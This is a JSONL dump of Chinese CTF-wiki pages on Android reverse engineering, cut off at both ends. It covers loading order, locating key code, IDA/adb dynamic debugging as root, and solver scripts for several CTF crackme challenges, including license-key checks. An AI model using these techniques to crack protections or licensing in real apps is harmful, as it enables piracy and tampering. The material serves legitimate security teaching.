JNI_OnLoad in \\\"%s\\\"\",\n                                              pathName).c_str());\n            } else if (dvmIsBadJniVersion(version)) {\n                *detail = strdup(StringPrintf(\"Bad JNI version returned from JNI_OnLoad in \\\"%s\\\": %d\",\n                                              pathName, version).c_str());\n                /*\n                 * It's unwise to call dlclose() here, but we can mark it\n                 * as bad and ensure that future load attempts will fail.\n                 *\n                 * We don't know how far JNI_OnLoad got, so there could\n                 * be some partially-initialized stuff accessible through\n                 * newly-registered native method calls.  We could try to\n                 * unregister them, but that doesn't seem worthwhile.\n                 */\n            } else {\n                result = true;\n            }\n            if (gDvm.verboseJni) {\n                ALOGI(\"[Returned %s from JNI_OnLoad for \\\"%s\\\"]\",\n                      (result ? \"successfully\" : \"failure\"), pathName);\n            }\n        }\n\n        if (result)\n            pNewEntry->onLoadResult = kOnLoadOkay;\n        else\n            pNewEntry->onLoadResult = kOnLoadFailed;\n\n        pNewEntry->onLoadThreadId = 0;\n\n        /*\n         * Broadcast a wakeup to anybody sleeping on the condition variable.\n         */\n        dvmLockMutex(&pNewEntry->onLoadLock);\n        pthread_cond_broadcast(&pNewEntry->onLoadCond);\n        dvmUnlockMutex(&pNewEntry->onLoadLock);\n        return result;\n    }\n}\n```\n\n## 总结\n\n这说明加载 .so 文件时，会按照执行如下顺序的函数（如果不存在的话，就会跳过）\n\n- .init 函数\n- .init_array 中的函数\n- JNI_OnLoad 函数\n\n", "timestamp": "2025-10-21T22:02:37.703679"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/android/basic_operating_mechanism/readme.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/android/basic_operating_mechanism/readme.md", "content": "# Android 应用运行机制简述\n\n本部分主要关注 Android 中 Java 层代码与 Native 层代码的基本运行原理。\n\n一般而言，在启动一个 App 时，Android 会首先执行 Application 类（AndroidManifest.xml 文件中注明）的创建工作，然后再开始执行 Main Activity，继而根据各种各样的逻辑执行相关代码。\n\n注：本部分的内容可能存在以下问题\n\n- 简略\n- 理解不到位\n\n如果发现可以补充的地方，欢迎随时及时补充。当然，本部分内容也会随着时间不断更新。", "timestamp": "2025-10-21T22:02:37.828236"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/android/basic_reverse/android_code_location.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/android/basic_reverse/android_code_location.md", "content": "# Android 关键代码定位\n\nAndroidManifest.xml文件\n\n- 软件包名\n- apk主活动，隐藏程序没有主Activity\n\nApplication在 java层启动最早，\n\n## 顺序分析\n\n最常见也是最有用的方法就是，我们顺着程序的逻辑依次查看程序的代码来进行分析，但是当程序代码量特别大时候，这一方法的效率就比较低下，需要其他方法来辅助。\n\n## 字符串定位法\n\n所谓字符串定位法就是通过在程序程序运行过程中出现的字符串来定位相应的函数。字符串有可能被直接硬编码在程序中，也有可能通过字符串id来索引。这一方法故去使用比较方便，但现在的话，有可能字符串会被分开或者说首先被加密，在运行的过程中被动态解密。\n\n我们可能关注的字符串可能有\n\n- 程序报错信息\n- 服务\n- 广播\n\n## 敏感API定位\n\n所谓敏感API定位法，意思就是我们根据程序的执行行为来判断程序可能调用了哪些函数。这一方法需要我们对于Android中的API比较熟悉。一般来说，我们可能会关注以下方面\n\n- 控件的事件函数\n    - onclick\n    - show\n    - Toast\n- 网络函数\n    - HttpGet\n    - HttpPost\n    - HttpUriRequest\n    - socket\n- 发送短信\n- 打电话\n- 定位\n- 等等\n\n\n## log信息\n\n所谓log信息就是Android程序在运行时输出的字符串信息，这部分信息不会在我们的界面上体现，因而我们需要使用其它辅助工具来分析，比如说，我们可以使用ddms来辅助分析。对于log信息来说，我们可以从两个方面考虑\n\n- 利用程序本身产生的log信息\n- 自己对代码反编译，插入log信息，并重打包来进行分析。\n\n## 栈跟踪\n\n我们可以用ddms提供的方法调用链的信息来判断程序目前的调用关系如何。\n\n## 钩子\n\n- xposed\n- cydia\n\n## monitor\n\n- 运行log，程序运行产生的，系统运行产生的\n- 线程跟踪\n- 方法调用链\n\n## 动态调试", "timestamp": "2025-10-21T22:02:38.094795"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/android/basic_reverse/dynamic/dynamic_debug.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/android/basic_reverse/dynamic/dynamic_debug.md", "content": "# Android 动态调试\n\n## Android 调试基本原理\n\n一般来说，Android 根据如下的顺序来判断一个应用是否可以被调试\n\n1.  检测 boot.img 中的 ro.debuggable 是否为1，为 1 的话，手机中的任何应用均可以调试。\n2.  否则，检测对应应用中 AndroidManifest.xml 中 \\<application\\>  元素中是否包含了android:debuggable=\"true\"，如果有的话，才会开启调试支持。\n\n自然，我们也就有两种方法来使得一个应用可以被调试\n\n1.  将一个 apk 文件解包，在 \\<application\\> 元素中添加 android:debuggable=\"true\"，然后重打包，签名。\n2.  修改 boot.img 中的 ro.debuggable 为 1。\n\n一般来说，因为前者需要我们每次都需要修改应用，比较麻烦，我们更倾向于后者，。\n\n对于后者来说，我们需要 root 手机，并刷入相关的镜像。（**！！找一篇合适的文章！！**）\n\n此外，由 Andoird AVD 生成的模拟器默认情况下 ro.debuggable 被设置为1。\n\n`ro.debuggable` 的值可以根据如下命令来查询\n\n```shell\nadb shell getprop ro.debuggable\n```\n\n## 基本调试工具\n\n### DDMS\n\nDDMS（Dalvik Debug Monitor Service）是Dalvik虚拟机调试监控服务，可以监视Android程序在运行过程中的状态以及结果，可以大大加快我们的程序分析效率。这是一款由Android SDK提供的工具，其中有设备截屏，查看运行的线程信息、文件浏览、Logcat、Method Profiling、广播状态信息、模拟电话呼叫、接收SMS等功能。该工具一般位于Android SDK的tools目录下，其中ddms.bat就是用来启动DDMS的。DDMS中比较重要的功能主要是\n\n- 文件浏览，我们可以观察并分析程序在执行过程中对文件的生成，修改，删除操作。\n- Logcat，可以输出软件的一些调试信息。\n- Method Profiling，可以跟踪程序的执行流程。\n\n### IDEA/Android Studio\n\n安装 smaliidea 插件，动态调试smali。\n\n### IDA Pro\n\n吾爱破解。\n\n", "timestamp": "2025-10-21T22:02:38.343396"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/android/basic_reverse/dynamic/ida_native_debug.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/android/basic_reverse/dynamic/ida_native_debug.md", "content": "# IDA 动态调试原生层程序\n\n这里我们会介绍如何调试以下种类的程序\n\n- 基本的原生层程序，即简单的 C/C++ 程序。\n- 原生 so 程序\n\n## 必备工具\n\n- **已经root的手机**\n- IDA\n\n## 基本原理\n\n在使用 ida 动态调试原生层程序时，主要会使用到 android_server 程序。该程序会使用 ptrace 技术注入到要调试的程序中。\n\n每一个进程都有一个 status 文件，其中有一字段 TracerPid 用来标识该进程是被哪个进程 ptrace 了。如果没有被其他进程 ptrace，那么就返回 0，否则返回对应进程的 pid。\n\n## 基本环境搭建\n\n无论是调试什么原生层程序，基本的环境搭建都是类似的，需要确保 IDA 与手机通信正常。\n\n1. 上传 android_server 文件(在 ida 的 dbgsrv 文件夹下)，并修改相应权限使其可以执行\n\n```shell\nadb push android_server /data/local/tmp/\nadb shell chmod 755 /data/local/tmp/android_server\n```\n\n2. 开启 android_server，其会监听 23946 端口(以 root 权限运行)\n\n```shell\nadb shell # 进入adb\nsu # 切换root\n./data/local/tmp/android_server #启动android_server\n```\n3. 建立本地计算机 23496 端口与手机端口 23946 的通信。当 PC 有客户端连接 23946 端口时，其发送的信息都将被转发到手机的相应的端口，这时 android_server 就收到相应的数据，从而使得 IDA 可以调试程序。前面的 tcp 的端口指的是本地 PC 的端口，后面的指的是手机的端口。\n\n```shell\nadb forward tcp:23946 tcp:23946\n```\n注意：\n\n> 其实这个连接建立的是 adb server 与与手机上 adbd 之间的通信。所以其通信大概是这个样子的\n>\n> IDA<-->adb server<--->adbd<---->android_server\n>\n> ​         电脑                   |             手机\n\n**其中，第一步只需要执行一次，后面就不需要再次执行。而第 2-3 步每次都得执行，因此可以写成一个脚本，并将脚本的路径放在系统的 path 环境变量下，这样我们可以执行一个命令直接执行。**\n\n## 基本原生程序调试-法1\n\n基本原生程序指的是普通的编译为 arm 汇编的 c/c++ 程序。\n\n### 添加程序\n\n这里我们以<u>http://www.52pojie.cn/thread-554068-1-1.html</u>中的 debugnativeapp 为例子。\n\n首先，我们需要把原生程序放到 android 设备中，并修改其权限，使其可以被执行。如下\n\n```shell\nadb push debugnativeapp /data/local/tmp/\nadb shell chmod 755 /data/local/tmp/debugnativeapp\n```\n\n### 启动调试\n\n根据原生层程序的位数选择相应的 ida，然后选择 Debugger-Run-RemoteArmLinux/Android debugger，如下界面\n\n![](./figure/debug_run_android.png)\n\n其中，重要的参数意义如下\n\n- Application\n  - 被调试程序在手机上的绝对路径。\n- Directory\n  - 被调试程序在手机中的目录\n- Hostname\n  - 即我们与哪个主机进行通信，这里我们直接和本地PC进行通信。\n\n其中 Debug options 选择如下\n\n![](./figure/debug_run_setup.png)\n\n主要是选择了三个 Events，使得我们的程序可以在入口点，线程启动时，library加载时自动停止。当然，也可以都进行选择。\n\n启动程序后，如下\n\n![](./figure/debug_run_run.png)\n\n注：\n\n> 1. 如果发现can not load plugin ，那可能是手机没有root。\n>\n> 2. 如果遇到以下问题，直接cancel就好。具体原因还不清楚。\n>\n>    ![](./figure/debug_run_linker.png)\n>\n> 3. 如果遇到error: only position independent executables (PIE) are supported.一般是因为android手机的版本大于5，可以尝试\n>\n>    - 使用android_server的PIE版本\n>    - 利用010Editor将可执行ELF文件的header中的elf header字段中的e_type改为ET_DYN(3)。\n\n## so原生程序调试\n\n对于 so 原生程序，我们可能会想这和普通原生程序有什么不一样的地方呢？自然是有的，so文件不能单独运行。一般是其它程序调用 so 文件中的基本某些函数。所以这里我们就不能直接采用上面 run 的方式了。一般来说，android 中 so 文件都是依赖于 apk 文件的。\n\n这里我们以 <u>http://www.52pojie.cn/thread-554068-1-1.html</u> 中的 debugjniso.apk 为例子。\n\n**首先，必须搭建基本调试环境。**\n\n### 安装程序\n\n首先，我们需要将 apk 安装到手机上。\n\n```shell\nadb install debugjniso.apk\n```\n\n### 调试模式启动app\n\n其次，我们需要以**调试模式启动程序**，这样，才可以方便 IDA 来捕捉到相应的程序并对其进行 attach。\n\n ```shell\nadb shell am start -D -n packagename/.MainActivity\n ```\n\n### attach程序\n\n启动 IDA pro，点击Debugger-Attach-RemoteArmLinux/Android debugger，Hostname 填 localhost，port 默认就是 23946 端口。其实就是我们本地电脑的监听端口。如下\n\n![](./figure/debug_setup.png)\n\n点击 ok，启动调试\n\n**注意：**\n\n> 如果最后出现只有一个程序 /bin/sh 可以被 attach，那说明没有以 root 权限运行 android_server 程序。\n\n利用 ctrl+f 快速定位并选择相应的进程，如下\n\n![](./figure/debug_attach_process.png)\n\n然后ok确定即可。\n\n这时我们可以看到我们已经 attach 成功了。\n\n![](./figure/debug_attach_libc.png)\n\n这时候我们再点击 Debugger-Debugger options，设置相关选项如下\n\n![](./figure/debug_attach_setup.png)\n\n意思类同于原生程序。\n\n> 为什么这时候才选择要设下相应的断点，是因为如果在开始attach的时候就设置的话，到这里其实是没有的。大家可以试试。\n\n### 恢复 app 执行\n\n这时候，app 的界面是 wait for debugger，我们也已经 attach 上去了。这时候，就需要让程序继续运行了。\n\n首先，我们打开 ddms 来选中我们要调试的进程。\n\n![](./figure/ddms.png)\n\n这里其实相当于直接执行了\n\n```shell\n# 显示手机所有可供调试的用户进程\nadb jdwp\n# 在PC的xxx端口与手机的相应端口之间建立连接，方便通信\nadb forward tcp:xxx jdwp:<pid>\n```\n\n之所以不使用命令去执行，是因为我们还得自己去确定我们的 apk 的进程号，这会比较麻烦。\n\n这里给出一个基本的通信过程\n\n![](./figure/jdb-debugging.png)\n\n此时，我们的电脑已经与手机的 app 虚拟机之间建立了通信。\n\n同时，我们需要使用 jdb 在 java 层来将我们的 apk 应用 attach 到我们的电脑上，这里我们使用如下的命令。\n\n```shell\njdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=xxx\n```\n\n其中 xxx 就是我们在 ddms 看到的 8700 端口，一般默认就是这个。执行之后\n\n```shell\nC:\\Users\\iromise\nλ jdb.bat\n\njdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700\n设置未捕获的java.lang.Throwable\n设置延迟的未捕获的java.lang.Throwable\n正在初始化jdb...\n>\n```\n\n我们再次看一下我们的手机，\n\n![](./figure/debug_attach_mobile.png)\n\n此时，应用已经又继续运行了，不再是之前的 wait for debugger 了。\n\n### 确定原生函数地址\n\n这里我们再次打开一个 ida，导入该 apk 的 so 库，然后在 export 中寻找我们的函数，如下\n\n![](./figure/debug_attach_jnistring.png)\n\n可以看出其偏移为 0xc38。\n\n我们再在之前的调试的 IDA 中运行 F9 直到怎么按都不再运行，我们会看到程序断在 linker 处\n\n![](./figure/debug_attach_linker.png)\n\n此时，我们**点击 app 界面的设置标题按钮**（之所以要按这个，是因为在该函数中调用了原生 API），再次观察IDA，可以看出该 so 库已经被加载进入\n\n```text\nB3B05000: loaded /data/app/com.droider.debugjniso-1/oat/arm/base.odex\nB39B9000: loaded /system/lib/hw/gralloc.msm8974.so\nB39B2000: loaded /system/lib/libmemalloc.so\nB39AA000: loaded /system/lib/libqdutils.so\nB3B00000: loaded /data/app/com.droider.debugjniso-1/lib/arm/libdebugjniso.so\n```\n\n这时，我们利用 ctrl+s 定位到该库的起始地址处 0xB3B00000。然后根据\n\n```text\n绝对地址=基地址+相对偏移\n```\n\n得到 jnistring 的地址。\n\n### 观察结果\n\n按下 g，然后输入 `+0xC38` ，点击 ok 即可跳转至该函数\n\n```assembly\nlibdebugjniso.so:B3B00C38 Java_com_droider_debugjniso_TestJniMethods_jniString\nlibdebugjniso.so:B3B00C38 LDR             R1, =(unk_B3B02148 - 0xB3B00C4C)\nlibdebugjniso.so:B3B00C3C STMFD           SP!, {R4,LR}\nlibdebugjniso.so:B3B00C40 LDR             R3, [R0]\nlibdebugjniso.so:B3B00C44 ADD             R1, PC, R1 ; unk_B3B02148\nlibdebugjniso.so:B3B00C48 MOV             LR, PC\n```\n\n我们在此函数的开始处 F2 下断点，然后再次F9执行程序，同时观看手机，就可以发现app的标题变成了`你好！Nativemethod` 。\n\n到此，so 原生程序的基本调试步骤就结束了。\n\n注：\n\n> 如果中间出现了add map的对话框直接点击Cancel，然后apply即可。\n\n### 注意事项\n\n1.  当使用模拟器调试 apk 出现异常时，很有可能是应用检测了是否运行在模拟器环境下，考虑使用手机。\n2.  当使用真机调试 apk 时，也有可能会遇到异常，卡在某一条指令上，这时我们可以手动执行这条指令，然后将 PC 设置为下一条指令的地址。\n\n## 基本原生程序调试-法2\n\n待补充。\n\n## 多线程调试\n\n## 参考阅读\n\n- http://www.52pojie.cn/thread-554068-1-1.html\n- https://www.kanxue.com/chm.htm?id=10296&pid=node1000944\n", "timestamp": "2025-10-21T22:02:38.625752"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/android/basic_reverse/overview.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/android/basic_reverse/overview.md", "content": "# Android 逆向基本介绍\n\n首先，我们需要明确一下 Android 逆向的目的： **希望分析出程序的功能** 。那么我们自然也就有两个方面（方法与对象）可以考虑\n\n- 分析方法，可以采用以下方式\n    - 静态分析，对源代码进行逆向，然后阅读分析\n    - 动态分析，对代码进行动态调试，一般来说动态分析离不开静态分析。\n- 分析对象，一般有以下两类对象\n    - java，层代码\n    - 原生层代码\n\n不难看出，要想分析 Android 应用，基本的 java 层的知识与原生层的知识还是有必要掌握的。\n\n目前来说，Android 逆向主要应用于以下几个方向\n\n1. app 安全审查\n2. 系统漏洞挖掘\n3. 恶意代码杀查\n4. 同行业产品技术原理分析\n5. 移除安全机制", "timestamp": "2025-10-21T22:02:38.850031"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/android/basic_reverse/static/complex-example.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/android/basic_reverse/static/complex-example.md", "content": "# 静态分析综合题目\n\n## 2017 ISCC Crackone\n\n利用 jadx 进行反编译，可以得到程序的基本逻辑如下\n\n-   对用户输入的内容进行 base64 编码，然后在指定长度位置处插入`\\r\\n` ，这个似乎并没有什么乱用。\n-   之后程序将编码后的内容传递给 so 中的 check 函数。这个函数的逻辑如下\n\n```c\n  env = a1;\n  len = plen;\n  str = pstr;\n  v7 = malloc(plen);\n  ((*env)->GetByteArrayRegion)(env, str, 0, len, v7);\n  v8 = malloc(len + 1);\n  memset(v8, 0, len + 1);\n  memcpy(v8, v7, len);\n  v9 = 0;\n  for ( i = 0; ; ++i )\n  {\n    --v9;\n    if ( i >= len / 2 )\n      break;\n    v11 = v8[i] - 5;\n    v8[i] = v8[len + v9];\n    v8[len + v9] = v11;\n  }\n  v8[len] = 0;\n  v12 = strcmp(v8, \"=0HWYl1SE5UQWFfN?I+PEo.UcshU\");\n  free(v8);\n  free(v7);\n  return v12 <= 0;\n```\n\n不难看出，程序就是直接将 base64 之后的字符串的两半分别进行适当的操作，这里我们很容易写出 python 对应的恢复代码，如下\n\n```python\nimport base64\n\n\ndef solve():\n    ans = '=0HWYl1SE5UQWFfN?I+PEo.UcshU'\n    length = len(ans)\n    flag = [0] * length\n\n    beg = 0\n    end = length\n    while beg < length / 2:\n        end -= 1\n        flag[beg] = chr(ord(ans[end]) + 5)\n        flag[end] = ans[beg]\n        beg += 1\n    flag = ''.join(flag)\n    print base64.b64decode(flag)\nif __name__ == \"__main__\":\n    solve()\n```\n\n对应的结果如下\n\n```shell\n➜  2017ISCC python exp.py\nflag{ISCCJAVANDKYXX}\n```\n\n## 2017 NJCTF easycrack\n\n通过简单逆向，可以发现程序的基本逻辑如下\n\n1.  监控界面文本框，如果文本框内容改变则调用 native `parseText` 函数。\n2.   `parseText` 的主要功能如下\n    1.  首先调用 java 层的函数 messageMe 获取一个字符串 mestr。这个函数的逻辑基本是\n        1.  依次将 packagename 的最后一个 `.` 后面的字符串的每一个与 51进行异或，将结果拼接起来。\n    2.  然后以 mestr 长度为周期，将两者进行异或，核心逻辑 `str[i + j] = mestr[j] ^ iinput[i + j];`\n    3.  继而下面以 `I_am_the_key` 为密钥，使用 RC4 加密对该部分进行加密，然后将结果与最后的 `compare` 比较。这里猜测的依据如下\n        1.  在 init 函数中有 256 这个关键字，而且基本就是 RC4 密钥的初始化过程。\n        2.  crypt 函数显然就是一个 RC4 加密函数，明显就是 RC4 的加密逻辑。\n\n解密脚本如下\n\n```python\nfrom Crypto.Cipher import ARC4\n\ndef messageme():\n    name = 'easycrack'\n    init = 51\n    ans = \"\"\n    for c in name:\n        init = ord(c) ^ init\n        ans += chr(init)\n    return ans\n\ndef decrypt(cipher,key):\n    plain =\"\"\n    for i in range(0,len(cipher),len(key)):\n        tmp = cipher[i:i+len(key)]\n        plain +=''.join(chr(ord(tmp[i])^ord(key[i])) for i in range(len(tmp)))\n    return plain\n\ndef main():\n    rc4 = ARC4.new('I_am_the_key')\n    cipher = 'C8E4EF0E4DCCA683088134F8635E970EEAD9E277F314869F7EF5198A2AA4'\n    cipher = ''.join(chr(int(cipher[i:i+2], 16)) for i in range(0, len(cipher), 2))\n    middleplain = rc4.decrypt(cipher)\n    mestr = messageme()\n    print decrypt(middleplain,mestr)\n\n\nif __name__ == '__main__':\n    main()\n```\n\n结果如下\n\n```shell\n➜  2017NJCTF-easycrack python exp.py \nIt_s_a_easyCrack_for_beginners\n➜  2017NJCTF-easycrack \n```\n\n## 2018 强网杯 picture lock\n\n简单分析之后发现这是一个图片加密程序：java 层为 native 层传入 image/ 下的第一个文件名，以及希望加密后的图片文件名，包括对应的 apk 的签名的 md5。\n\n下面我们就可以分析 native 层代码，由于程序很明显说是一个加密程序，我们可以使用IDA 的 findcrypto 插件来进行识别，结果却是发现了 S 盒，而且基本上就是符合 AES 的加密流程的，所以可以基本确定程序的主体是一个 AES 加密，经过细致分析可以发现 native 层程序的基本流程如下\n\n1. 将传入的签名的 md5 字符串分为两半，生成两组密钥。\n2. 每次读入md5sig[i%32]大小的内容\n3. 根据读入的大小决定使用哪一组密钥\n   1. 奇数使用第二组密钥\n   2. 偶数使用第一组密钥\n4. 如果读入的大小不够 16 的话，就将后面填充为不够的大小（比如大小为12时，填充 4 个0x4）\n5. 这时修改后的内容必然够16个字节，对前16个字节进行 AES 加密。对于后面的字节，将其与 md5sig[i%32]依次进行异或。\n\n既然知道加密算法后，那就很容易逆了，我们首先可以获取签名的 md5，如下\n\n```shell\n➜  picturelock keytool -list -printcert -jarfile picturelock.apk\n签名者 #1:\n\n签名:\n\n所有者: CN=a, OU=b, O=c, L=d, ST=e, C=ff\n发布者: CN=a, OU=b, O=c, L=d, ST=e, C=ff\n序列号: 5f4e6be1\n有效期为 Fri Sep 09 14:32:36 CST 2016 至 Tue Sep 03 14:32:36 CST 2041\n证书指纹:\n\t MD5:  F8:C4:90:56:E4:CC:F9:A1:1E:09:0E:AF:47:1F:41:8D\n\t SHA1: 48:E7:04:5E:E6:0D:9D:8A:25:7C:52:75:E3:65:06:09:A5:CC:A1:3E\n\t SHA256: BA:12:C1:3F:D6:0E:0D:EF:17:AE:3A:EE:4E:6A:81:67:82:D0:36:7F:F0:2E:37:CC:AD:5D:6E:86:87:0C:8E:38\n签名算法名称: SHA256withRSA\n主体公共密钥算法: 2048 位 RSA 密钥\n版本: 3\n\n扩展:\n\n#1: ObjectId: 2.5.29.14 Criticality=false\nSubjectKeyIdentifier [\nKeyIdentifier [\n0000: 71 A3 2A FB D3 F4 A9 A9   2A 74 3F 29 8E 67 8A EA  q.*.....*t?).g..\n0010: 3B DD 30 E3                                        ;.0.\n]\n]\n➜  picturelock md5value=F8:C4:90:56:E4:CC:F9:A1:1E:09:0E:AF:47:1F:41:8D\n➜  picturelock echo $md5value | sed 's/://g' | tr '[:upper:]' '[:lower:]'\nf8c49056e4ccf9a11e090eaf471f418d\n```\n\n继而，我们可以直接使用已有的 AES 库来进行解密\n\n```python\n#!/usr/bin/env python\n\nimport itertools\n\nsig = 'f8c49056e4ccf9a11e090eaf471f418d'\n\nfrom Crypto.Cipher import AES\n\ndef decode_sig(payload):\n    ans = \"\"\n    for i in range(len(payload)):\n        ans +=chr(ord(payload[i]) ^ ord(sig[(16+i)%32]))\n    return ans\n\ndef dec_aes():\n\tdata = open('flag.jpg.lock', 'rb').read()\n\tjpg_data = ''\n\tf = open('flag.jpg', 'wb')\n\tidx = 0\n\ti = 0\n\tcipher1 = AES.new(sig[:0x10])\n\tcipher2 = AES.new(sig[0x10:])\n\twhile idx < len(data):\n\t\tread_len = ord(sig[i % 32])\n\t\tpayload = data[idx:idx+read_len]\n\t\t#print('[+] Read %d bytes' % read_len)\n\t\tprint('[+] Totally %d / %d bytes, sig index : %d' % (idx, len(data), i))\n\n\t\tif read_len % 2 == 0:\n\t\t\tf.write(cipher1.decrypt(payload[:0x10]))\n\t\telse:\n\t\t\tf.write(cipher2.decrypt(payload[:0x10]))\n\t\tf.write(decode_sig(payload[16:]))\n\t\tf.flush()\n\t\tidx += read_len\n\t\ti += 1\n\tprint('[+] Decoding done ...')\n\tf.close()\n\ndec_aes()\n```\n\n最后可以得到一个图片解密后的结果，其中就包含 flag 了。\n", "timestamp": "2025-10-21T22:02:39.167801"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/android/basic_reverse/static/java-example.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/android/basic_reverse/static/java-example.md", "content": "# 静态分析 java 层例子\n\n## 2014 tinyCTF Ooooooh! What does this button do\n\n### 确定文件类型\n\n通过linux的file命令可以看出该文件是一个压缩包，解压打开发现它其实是一个apk文件。\n\n### 安装apk\n\n安装文件之后，查看一下\n\n![](./figure/2014-tinyCTF-screen.png)\n\n可以看出其就是输入一个字符串，然后应该会弹出结果。\n\n### 查看程序\n\n```java\n    class C00721 implements OnClickListener {\n        C00721() {\n        }\n\n        public void onClick(View view) {\n            if (((EditText) MainActivity.this.findViewById(C0073R.id.passwordField)).getText().toString().compareTo(\"EYG3QMCS\") == 0) {\n                MainActivity.this.startActivity(new Intent(MainActivity.this, FlagActivity.class));\n            }\n        }\n    }\n\n```\n\n在主程序中，可以发现，如果我们输入的字符串为EYG3QMCS就会执行flagActivity.class。那么我们输入一下，可以得到如下结果\n\n![](./figure/2014-tinyCTF-flag.png)\n\n即得到flag。\n\n## 2014 ASIS Cyber Security Contest Finals Numdroid\n\n### 判断文件类型\n\n首先利用file判断一下文件类型，发现是个压缩包，解压缩一下，得到对应的文件，然后继续看一下，发现该文件是apk文件。\n\n### 安装程序\n\n安装一下程序。简单看一下页面，可以发现程序主要是输入密码，然后登陆。如果输入错的话会爆出“Wrong Password”的信息。\n\n![](./figure/2014-Numdroid-screen.png)\n\n### 分析程序\n\n根据相应的字符串来定位一下源程序中的关键函数。根据strings.xml可以发现该字符串的变量名为wrong，继而我们找到了如下代码。\n\n```java\n    protected void ok_clicked() {\n        DebugTools.log(\"clicked password: \" + this.mScreen.getText());\n        boolean result = Verify.isOk(this, this.mScreen.getText().toString());\n        DebugTools.log(\"password is Ok? : \" + result);\n        if (result) {\n            Intent i = new Intent(this, LipSum.class);\n            Bundle b = new Bundle();\n            b.putString(\"flag\", this.mScreen.getText().toString().substring(0, 7));\n            i.putExtras(b);\n            startActivity(i);\n            return;\n        }\n        Toast.makeText(this, R.string.wrong, 1).show();\n        this.mScreen.setText(\"\");\n    }\n\n```\n\n继续定位到Verify.isOk中。如下\n\n```java\n    public static boolean isOk(Context c, String _password) {\n        String password = _password;\n        if (_password.length() > 7) {\n            password = _password.substring(0, 7);\n        }\n        String r = OneWayFunction(password);\n        DebugTools.log(\"digest: \" + password + \" => \" + r);\n        if (r.equals(\"be790d865f2cea9645b3f79c0342df7e\")) {\n            return true;\n        }\n        return false;\n    }\n\n```\n\n可以发现程序主要是取password的前7位进行OneWayFunction加密，然后与be790d865f2cea9645b3f79c0342df7e进行比较。如果相等就会返回true。这里我们再看一下OneWayFunction，如下\n\n```java\n    private static String OneWayFunction(String password) {\n        List<byte[]> bytes = ArrayTools.map(ArrayTools.select(ArrayTools.map(new String[]{\"MD2\", \"MD5\", \"SHA-1\", \"SHA-256\", \"SHA-384\", \"SHA-512\"}, new AnonymousClass1(password)), new SelectAction<byte[]>() {\n            public boolean action(byte[] element) {\n                return element != null;\n            }\n        }), new MapAction<byte[], byte[]>() {\n            public byte[] action(byte[] element) {\n                int i;\n                byte[] b = new byte[8];\n                for (i = 0; i < b.length / 2; i++) {\n                    b[i] = element[i];\n                }\n                for (i = 0; i < b.length / 2; i++) {\n                    b[(b.length / 2) + i] = element[(element.length - i) - 2];\n                }\n                return b;\n            }\n        });\n        byte[] b2 = new byte[(bytes.size() * 8)];\n        for (int i = 0; i < b2.length; i++) {\n            b2[i] = ((byte[]) bytes.get(i % bytes.size()))[i / bytes.size()];\n        }\n        try {\n            MessageDigest digest = MessageDigest.getInstance(\"MD5\");\n            digest.update(b2);\n            byte[] messageDigest = digest.digest();\n            StringBuilder hexString = new StringBuilder();\n            for (byte aMessageDigest : messageDigest) {\n                String h = Integer.toHexString(aMessageDigest & MotionEventCompat.ACTION_MASK);\n                while (h.length() < 2) {\n                    h = \"0\" + h;\n                }\n                hexString.append(h);\n            }\n            return hexString.toString();\n        } catch (NoSuchAlgorithmException e) {\n            return \"\";\n        }\n    }\n```\n\n函数大概就是执行了几个hash值，但是自己去分析的话，太过于复杂，，由于本题的答案空间($10^7$)比较小，所以我们可以把verify类中的方法拿出来自己暴力跑一下。\n\n### 构造程序\n\n提取出java程序之后，在Verify类中添加main函数并修复部分错误，从而得到对应的答案。\n\n这里对应的代码放在了example对应的文件夹中。\n\n需要注意的是，这里如果对应的hash函数不存在的话，源程序会跳过对应的函数。我直接全部跑没有找到，然后去掉了一个不常见的MD2算法，从而得到了答案。这说明android应该是没有md2算法的。\n\n输入之后得到如下\n\n![](./figure/2014-Numdroid-flag.png)\n\n然后我们计算对应的MD值，从而获得flag为ASIS_3c56e1ed0597056fef0006c6d1c52463。\n\n## 2014 Sharif University Quals CTF Commercial Application\n\n### 安装程序\n\n首先，安装程序，随便点了点按钮，在右上方点击按钮会让我们输入key\n\n![](./figure/2014-Sharif-key.png)\n\n随便输入了下，发现程序直接报错，告诉我们不对，那么我们可以根据这些信息来进行定位关键代码。\n\n![](./figure/2014-Sharif-key1.png)\n\n### 定位关键代码\n\n```java\n    public static final String NOK_LICENCE_MSG = \"Your licence key is incorrect...! Please try again with another.\";\n    public static final String OK_LICENCE_MSG = \"Thank you, Your application has full licence. Enjoy it...!\";\n\n\tprivate void checkLicenceKey(final Context context) {\n        if (this.app.getDataHelper().getConfig().hasLicence()) {\n            showAlertDialog(context, OK_LICENCE_MSG);\n            return;\n        }\n        View inflate = LayoutInflater.from(context).inflate(C0080R.layout.propmt, null);\n        Builder builder = new Builder(context);\n        builder.setView(inflate);\n        final EditText editText = (EditText) inflate.findViewById(C0080R.id.editTextDialogUserInput);\n        builder.setCancelable(false).setPositiveButton(\"Continue\", new OnClickListener() {\n            public void onClick(DialogInterface dialogInterface, int i) {\n                if (KeyVerifier.isValidLicenceKey(editText.getText().toString(), MainActivity.this.app.getDataHelper().getConfig().getSecurityKey(), MainActivity.this.app.getDataHelper().getConfig().getSecurityIv())) {\n                    MainActivity.this.app.getDataHelper().updateLicence(2014);\n                    MainActivity.isRegisterd = true;\n                    MainActivity.this.showAlertDialog(context, 